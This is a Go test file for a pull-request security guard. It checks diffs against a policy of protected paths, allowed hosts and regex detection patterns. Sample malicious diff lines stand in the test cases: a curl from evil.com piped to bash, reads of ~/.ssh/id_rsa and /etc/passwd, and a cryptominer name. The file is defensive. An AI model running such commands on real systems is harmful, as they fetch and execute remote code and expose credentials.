package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func getTestPolicy() *Policy {
	policyYAML := `
protected_paths:
  - ".github/**"
  - "Dockerfile"
  - ".dockerignore"
  - ".gitleaksignore"
  - "LICENSE"
  - "SECURITY.md"
  - "CODEOWNERS"

max_files: 50
max_changed_lines: 1000

binary_extensions:
  - ".exe"
  - ".bin"
  - ".so"
  - ".dylib"
  - ".dll"
  - ".a"
  - ".o"
  - ".class"
  - ".wasm"
  - ".elf"
  - ".zip"
  - ".tar"
  - ".gz"

allowed_hosts:
  - "discord.com"
  - "hooks.slack.com"
  - "api.frankfurter.dev"
  - "horizon.stellar.org"
  - "github.com"
  - "go.dev"
  - "pkg.go.dev"
  - "shields.io"
  - "stellar.org"
  - "stellar.expert"

exempt_authors:
  maintainers:
    - "Sus-Nexus07"
    - "gofairway"
  dependabot:
    - "dependabot[bot]"
    - "dependabot"

suspicious_patterns:
  - name: "go_mod_replace"
    regex: "(?m)^\\+.*replace\\s+.*=>"
    severity: "REVIEW"
    notes: "replace directives in go.mod"

  - name: "os_exec"
    regex: "(?m)^\\+.*\"os/exec\""
    severity: "REVIEW"
    notes: "executes system binaries"

  - name: "syscall"
    regex: "(?m)^\\+.*\"(?:syscall|golang\\.org/x/sys(?:/[a-z0-9_]+)*)\""
    severity: "REVIEW"
    notes: "low-level OS calls"

  - name: "unsafe"
    regex: "(?m)^\\+.*\"unsafe\""
    severity: "REVIEW"
    notes: "bypasses Go type safety"

  - name: "plugin"
    regex: "(?m)^\\+.*\"plugin\""
    severity: "REVIEW"
    notes: "dynamic plugin loading"

  - name: "go_generate"
    regex: "(?m)^\\+\\s*//go:generate\\b"
    severity: "REVIEW"
    notes: "code generation directive"

  - name: "shell_download"
    regex: "(?m)^\\+.*\\b(?:curl\\s+[^\n]*|wget\\s+[^\n]*|\\|\\s*(?:ba)?sh\\b|bash\\s+-c|sh\\s+-c)"
    severity: "REVIEW"
    notes: "remote download or shell execution"

  - name: "long_encoded_blob"
    regex: "(?m)^\\+.*(?:\\b[A-Za-z0-9+/]{80,}={0,2}\\b|\\b[0-9a-fA-F]{80,}\\b)"
    severity: "REVIEW"
    notes: "long base64 or hex encoded blob"

  - name: "sensitive_file_or_env_access"
    regex: "(?m)^\\+.*(?:(?:~|\\$HOME|/home/[^/\\s]+)/\\.ssh\\b|/\\.ssh/|\\.aws/(?:credentials|config)|/\\.aws\\b|\\.npmrc\\b|/etc/passwd\\b|os\\.Environ\\(\\))"
    severity: "REVIEW"
    notes: "reads private credentials or environment dump"

  - name: "crypto_miner_keywords"
    regex: "(?i)(?m)^\\+.*\\b(?:stratum\\+(?:tcp|ssl)|cryptonight|xmrig|minergate|coinhive|monero|hashrate)\\b"
    severity: "REVIEW"
    notes: "cryptominer keywords"
`
	tmpFile := filepath.Join(os.TempDir(), "test_policy.yml")
	_ = os.WriteFile(tmpFile, []byte(policyYAML), 0o600)
	defer os.Remove(tmpFile)

	policy, err := LoadPolicy(tmpFile)
	if err != nil {
		panic(fmt.Sprintf("failed to parse test policy: %v", err))
	}
	return policy
}

func loadFixture(t *testing.T, filename string) []PRFile {
	t.Helper()
	path := filepath.Join("testdata", filename)
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("failed to read fixture %s: %v", path, err)
	}
	var files []PRFile
	if err := json.Unmarshal(data, &files); err != nil {
		t.Fatalf("failed to unmarshal fixture %s: %v", path, err)
	}
	return files
}

func TestGuardTableDriven(t *testing.T) {
	policy := getTestPolicy()

	tests := []struct {
		name           string
		fixture        string
		author         string
		title          string
		body           string
		labels         []string
		eventAction    string
		eventLabel     string
		sender         string
		changedFiles   int
		additions      int
		deletions      int
		expectedAction Action
		expectedRule   string
		expectExempt   bool
		expectApproved bool
	}{
		{
			name:           "Protected path change blocks untrusted contributor",
			fixture:        "protected_path_block.json",
			author:         "untrusted-user",
			title:          "Fixes #10: update CI",
			body:           "Closes #10 by tweaking CI",
			expectedAction: ActionBlock,
			expectedRule:   "protected-path",
		},
		{
			name:           "Added binary file blocks untrusted contributor",
			fixture:        "added_binary_block.json",
			author:         "untrusted-user",
			title:          "Fixes #12: add helper utility",
			body:           "Fixes #12 with new binary",
			expectedAction: ActionBlock,
			expectedRule:   "added-binary",
		},
		{
			name:           "go.mod replace directive flags review",
			fixture:        "replace_directive_review.json",
			author:         "external-dev",
			title:          "Fixes #20: bump postgres driver",
			body:           "Fixes #20 using replacement driver",
			expectedAction: ActionReview,
			expectedRule:   "go-mod-replace",
		},
		{
			name:           "Documentation only changes pass with INFO",
			fixture:        "docs_only_info.json",
			author:         "doc-writer",
			title:          "Fixes #30: update deployment instructions",
			body:           "Fixes #30 with clearer documentation",
			expectedAction: ActionInfo,
		},
		{
			name:           "Maintainer PR is exempt even when modifying protected paths",
			fixture:        "protected_path_block.json",
			author:         "Sus-Nexus07",
			title:          "Fixes #40: update CI pipeline",
			body:           "Fixes #40 with updated CI steps",
			expectedAction: ActionInfo,
			expectExempt:   true,
		},
		{
			name:           "Missing patch diff on modified file flags review",
			fixture:        "missing_patch_review.json",
			author:         "contributor-42",
			title:          "Fixes #50: refactor measurement engine",
			body:           "Fixes #50 with large diff",
			expectedAction: ActionReview,
			expectedRule:   "missing-patch",
		},
		{
			name:           "os/exec usage in code flags review",
			fixture:        "os_exec_review.json",
			author:         "contributor-42",
			title:          "Fixes #60: add shell runner",
			body:           "Fixes #60 by executing shell commands",
			expectedAction: ActionReview,
			expectedRule:   "os_exec",
		},
		{
			name:           "Unapproved host URL flags review",
			fixture:        "unallowed_url_review.json",
			author:         "telemetry-coder",
			title:          "Fixes #70: add analytics ping",
			body:           "Fixes #70 with remote telemetry",
			expectedAction: ActionReview,
			expectedRule:   "unallowed-host-url",
		},
		{
			name:           "Missing issue reference is demoted to INFO",
			fixture:        "docs_only_info.json",
			author:         "contributor-xyz",
			title:          "Update documentation",
			body:           "Forgot to link an issue here",
			expectedAction: ActionInfo,
			expectedRule:   "missing-issue-reference",
		},
		{
			name:           "PR exceeding max changed lines limit flags review",
			fixture:        "docs_only_info.json",
			author:         "big-pr-dev",
			title:          "Fixes #80: massive overhaul",
			body:           "Fixes #80 with 2500 lines changed",
			additions:      2000,
			deletions:      500,
			expectedAction: ActionReview,
			expectedRule:   "max-lines-exceeded",
		},
		{
			name:           "REVIEW passes when maintainer applies security-reviewed label",
			fixture:        "replace_directive_review.json",
			author:         "external-dev",
			title:          "Fixes #90: module replace directive",
			body:           "Fixes #90 with replacement module",
			labels:         []string{"security-reviewed"},
			eventAction:    "labeled",
			eventLabel:     "security-reviewed",
			sender:         "Sus-Nexus07", // Maintainer
			expectedAction: ActionReview,
			expectedRule:   "go-mod-replace",
			expectApproved: true,
		},
		{
			name:           "Non-maintainer applying security-reviewed label fails approval",
			fixture:        "replace_directive_review.json",
			author:         "external-dev",
			title:          "Fixes #91: module replace directive",
			body:           "Fixes #91 with replacement module",
			labels:         []string{"security-reviewed"},
			eventAction:    "labeled",
			eventLabel:     "security-reviewed",
			sender:         "untrusted-contributor",
			expectedAction: ActionReview,
			expectedRule:   "go-mod-replace",
			expectApproved: false,
		},
		{
			name:           "Synchronize event clears/invalidates security-reviewed label",
			fixture:        "replace_directive_review.json",
			author:         "external-dev",
			title:          "Fixes #92: module replace directive",
			body:           "Fixes #92 with replacement module",
			labels:         []string{"security-reviewed"},
			eventAction:    "synchronize",
			sender:         "external-dev",
			expectedAction: ActionReview,
			expectedRule:   "go-mod-replace",
			expectApproved: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			files := loadFixture(t, tc.fixture)
			pr := PRMetadata{
				Number:       99,
				Title:        tc.title,
				Body:         tc.body,
				Author:       tc.author,
				Sender:       tc.sender,
				EventAction:  tc.eventAction,
				EventLabel:   tc.eventLabel,
				Labels:       tc.labels,
				ChangedFiles: tc.changedFiles,
				Additions:    tc.additions,
				Deletions:    tc.deletions,
			}

			result := Evaluate(policy, pr, files)

			if result.Action != tc.expectedAction {
				t.Fatalf("expected action %s, got %s (findings: %+v)", tc.expectedAction, result.Action, result.Findings)
			}

			if tc.expectApproved != result.Approved {
				t.Fatalf("expected approved %v, got %v", tc.expectApproved, result.Approved)
			}

			if tc.expectExempt && !result.Exempt {
				t.Fatalf("expected exempt true, got false")
			}

			if tc.expectedRule != "" {
				found := false
				for _, f := range result.Findings {
					if f.Rule == tc.expectedRule {
						found = true
						break
					}
				}
				if !found {
					t.Fatalf("expected finding rule %q, got findings: %+v", tc.expectedRule, result.Findings)
				}
			}
		})
	}
}

func TestSuspiciousPatterns(t *testing.T) {
	policy := getTestPolicy()

	patterns := []struct {
		name         string
		patchContent string
		expectedRule string
	}{
		{
			name:         "syscall package import",
			patchContent: "+import \"syscall\"\n",
			expectedRule: "syscall",
		},
		{
			name:         "unsafe package import",
			patchContent: "+import \"unsafe\"\n",
			expectedRule: "unsafe",
		},
		{
			name:         "plugin package import",
			patchContent: "+import \"plugin\"\n",
			expectedRule: "plugin",
		},
		{
			name:         "go:generate directive",
			patchContent: "+//go:generate mockgen -source=foo.go\n",
			expectedRule: "go_generate",
		},
		{
			name:         "shell download with curl",
			patchContent: "+curl -s https://evil.com/setup.sh | bash\n",
			expectedRule: "shell_download",
		},
		{
			name:         "long hex or base64 blob",
			patchContent: "+var secret = \"4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b\"\n",
			expectedRule: "long_encoded_blob",
		},
		{
			name:         "sensitive file access ~/.ssh",
			patchContent: "+data, _ := os.ReadFile(\"~/.ssh/id_rsa\")\n",
			expectedRule: "sensitive_file_or_env_access",
		},
		{
			name:         "sensitive file access /etc/passwd",
			patchContent: "+data, _ := os.ReadFile(\"/etc/passwd\")\n",
			expectedRule: "sensitive_file_or_env_access",
		},
		{
			name:         "cryptominer keyword xmrig",
			patchContent: "+const miner = \"xmrig.exe\"\n",
			expectedRule: "crypto_miner_keywords",
		},
	}

	for _, tc := range patterns {
		t.Run(tc.name, func(t *testing.T) {
			files := []PRFile{
				{
					Filename: "internal/service.go",
					Status:   "modified",
					Patch:    tc.patchContent,
				},
			}
			pr := PRMetadata{
				Title:  "Fixes #1: safe title",
				Body:   "Closes #1",
				Author: "contributor",
			}

			result := Evaluate(policy, pr, files)
			if result.Action != ActionReview {
				t.Fatalf("expected action REVIEW, got %s", result.Action)
			}

			found := false
			for _, f := range result.Findings {
				if f.Rule == tc.expectedRule {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("expected finding rule %q, got: %+v", tc.expectedRule, result.Findings)
			}
		})
	}
}

func TestAllowedAndUnallowedURLs(t *testing.T) {
	policy := getTestPolicy()

	pr := PRMetadata{
		Title:  "Fixes #5: test URLs",
		Body:   "Closes #5",
		Author: "contributor",
	}

	// Test approved URLs: horizon.stellar.org, github.com, api.frankfurter.dev, go.dev, pkg.go.dev, shields.io, stellar.org, stellar.expert
	approvedFiles := []PRFile{
		{
			Filename: "internal/measure/client.go",
			Status:   "modified",
			Patch: `+const endpoint = "https://horizon.stellar.org/paths"
+const git = "https://github.com/gofairway/fairway"
+const godoc = "https://pkg.go.dev/github.com/lib/pq"
+const gosite = "https://go.dev/dl"
+const badge = "https://shields.io/badge/build-passing-brightgreen"
+const stellar = "https://stellar.org/learn"
+const expert = "https://stellar.expert/explorer/public"
`,
		},
	}
	resApproved := Evaluate(policy, pr, approvedFiles)
	for _, f := range resApproved.Findings {
		if f.Rule == "unallowed-host-url" {
			t.Fatalf("unexpected unallowed-host-url finding for approved hosts: %v", f)
		}
	}

	// Test documentation files: URLs outside allowlist in .md or docs/ are exempt
	docFiles := []PRFile{
		{
			Filename: "docs/external-reference.md",
			Status:   "modified",
			Patch:    "+Refer to documentation at https://some-external-unlisted-library.io/docs\n",
		},
		{
			Filename: "README.md",
			Status:   "modified",
			Patch:    "+Check https://arbitrary-unlisted-blog.com/guide for details\n",
		},
	}
	resDocs := Evaluate(policy, pr, docFiles)
	for _, f := range resDocs.Findings {
		if f.Rule == "unallowed-host-url" {
			t.Fatalf("unexpected unallowed-host-url finding for documentation file: %v", f)
		}
	}

	// Test unapproved URL in Go source code (must be flagged for review)
	unapprovedFiles := []PRFile{
		{
			Filename: "internal/measure/client.go",
			Status:   "modified",
			Patch:    "+const bad = \"https://unapproved-external-host.org/api\"\n",
		},
	}
	resUnapproved := Evaluate(policy, pr, unapprovedFiles)
	found := false
	for _, f := range resUnapproved.Findings {
		if f.Rule == "unallowed-host-url" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected unallowed-host-url finding for unapproved host in source code")
	}
}

func TestDependabotExemption(t *testing.T) {
	policy := getTestPolicy()

	// Dependabot updating only go.mod and go.sum is exempt
	pr := PRMetadata{
		Title:  "build(deps): bump github.com/lib/pq from 1.12.2 to 1.12.3",
		Body:   "Bumps lib/pq. Fixes #10",
		Author: "dependabot[bot]",
	}
	files := []PRFile{
		{Filename: "go.mod", Status: "modified", Patch: "+ require github.com/lib/pq v1.12.3\n"},
		{Filename: "go.sum", Status: "modified", Patch: "+ github.com/lib/pq v1.12.3 ...\n"},
	}
	res := Evaluate(policy, pr, files)
	if res.Action != ActionInfo || !res.Exempt {
		t.Fatalf("expected dependabot dependency PR to be exempt INFO, got action %s exempt %v", res.Action, res.Exempt)
	}

	// Dependabot touching non-dependency file is NOT exempt
	filesNonDep := []PRFile{
		{Filename: "go.mod", Status: "modified"},
		{Filename: "internal/api/api.go", Status: "modified"},
	}
	resNonDep := Evaluate(policy, pr, filesNonDep)
	if resNonDep.Exempt {
		t.Fatalf("expected dependabot touching application code to NOT be exempt")
	}
}

func TestAPIPaginationAnd3000FileLimit(t *testing.T) {
	// Mock GitHub API server using httptest.Server (no external network!)
	pageRequests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.Contains(r.URL.Path, "/pulls/10/files") {
			http.NotFound(w, r)
			return
		}
		pageRequests++
		page := r.URL.Query().Get("page")

		var batch []PRFile
		switch page {
		case "1":
			for i := 0; i < 100; i++ {
				batch = append(batch, PRFile{Filename: fmt.Sprintf("file_%d.txt", i), Status: "modified", Patch: "@@ -1 +1 @@\n+ok"})
			}
		case "2":
			for i := 100; i < 150; i++ {
				batch = append(batch, PRFile{Filename: fmt.Sprintf("file_%d.txt", i), Status: "modified", Patch: "@@ -1 +1 @@\n+ok"})
			}
		default:
			batch = []PRFile{}
		}

		w.Header().Set("Content-Type", "application/vnd.github.v3+json")
		_ = json.NewEncoder(w).Encode(batch)
	}))
	defer server.Close()

	client := NewGitHubClient(server.URL, "fake-token")
	files, err := client.FetchPRFiles(context.Background(), "owner", "repo", 10)
	if err != nil {
		t.Fatalf("FetchPRFiles returned error: %v", err)
	}

	if len(files) != 150 {
		t.Fatalf("expected 150 files across 2 pages, got %d", len(files))
	}
	if pageRequests != 2 {
		t.Fatalf("expected 2 page requests, got %d", pageRequests)
	}
}

func TestCommentAndLabelOperations(t *testing.T) {
	// Mock GitHub API server to verify comment creation/update, label apply, and PR close
	existingComments := []issueComment{
		{ID: 101, Body: "Initial comment without marker"},
		{ID: 202, Body: "<!-- fairway-pr-guard -->\nExisting review comment"},
	}

	var patchedCommentID int64
	var patchedCommentBody string
	var appliedLabel string
	var removedLabel string
	var closedPR bool

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, "/issues/10/comments"):
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(existingComments)

		case r.Method == http.MethodPatch && strings.Contains(r.URL.Path, "/issues/comments/202"):
			var payload map[string]string
			_ = json.NewDecoder(r.Body).Decode(&payload)
			patchedCommentID = 202
			patchedCommentBody = payload["body"]
			w.WriteHeader(http.StatusOK)

		case r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/issues/10/labels"):
			var payload struct {
				Labels []string `json:"labels"`
			}
			_ = json.NewDecoder(r.Body).Decode(&payload)
			if len(payload.Labels) > 0 {
				appliedLabel = payload.Labels[0]
			}
			w.WriteHeader(http.StatusOK)

		case r.Method == http.MethodDelete && strings.Contains(r.URL.Path, "/issues/10/labels/"):
			removedLabel = strings.TrimPrefix(r.URL.Path, "/repos/owner/repo/issues/10/labels/")
			w.WriteHeader(http.StatusOK)

		case r.Method == http.MethodPatch && strings.HasSuffix(r.URL.Path, "/pulls/10"):
			closedPR = true
			w.WriteHeader(http.StatusOK)

		default:
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer server.Close()

	client := NewGitHubClient(server.URL, "dummy-token")
	ctx := context.Background()

	// 1. PostOrUpdateComment should update comment ID 202 without spamming a new comment
	err := client.PostOrUpdateComment(ctx, "owner", "repo", 10, "<!-- fairway-pr-guard -->\nUpdated notice")
	if err != nil {
		t.Fatalf("PostOrUpdateComment error: %v", err)
	}
	if patchedCommentID != 202 {
		t.Fatalf("expected existing comment 202 to be updated, got ID %d", patchedCommentID)
	}
	if !strings.Contains(patchedCommentBody, "Updated notice") {
		t.Fatalf("unexpected comment body: %s", patchedCommentBody)
	}

	// 2. ApplyLabel
	if err := client.ApplyLabel(ctx, "owner", "repo", 10, "needs-security-review"); err != nil {
		t.Fatalf("ApplyLabel error: %v", err)
	}
	if appliedLabel != "needs-security-review" {
		t.Fatalf("expected label 'needs-security-review', got %q", appliedLabel)
	}

	// 3. RemoveLabel
	if err := client.RemoveLabel(ctx, "owner", "repo", 10, "security-reviewed"); err != nil {
		t.Fatalf("RemoveLabel error: %v", err)
	}
	if removedLabel != "security-reviewed" {
		t.Fatalf("expected removed label 'security-reviewed', got %q", removedLabel)
	}

	// 4. ClosePR
	if err := client.ClosePR(ctx, "owner", "repo", 10); err != nil {
		t.Fatalf("ClosePR error: %v", err)
	}
	if !closedPR {
		t.Fatalf("expected PR to be closed")
	}
}

func TestResolveToken(t *testing.T) {
	origEnv := os.Getenv("GITHUB_TOKEN")
	defer func() {
		_ = os.Setenv("GITHUB_TOKEN", origEnv)
	}()

	_ = os.Setenv("GITHUB_TOKEN", "env-token-xyz")
	if tok := ResolveToken(""); tok != "env-token-xyz" {
		t.Fatalf("expected env token 'env-token-xyz', got %q", tok)
	}

	if tok := ResolveToken("override-token"); tok != "override-token" {
		t.Fatalf("expected override token 'override-token', got %q", tok)
	}

	_ = os.Unsetenv("GITHUB_TOKEN")
	if tok := ResolveToken(""); tok != "" {
		t.Fatalf("expected empty token when env unset, got %q", tok)
	}
}

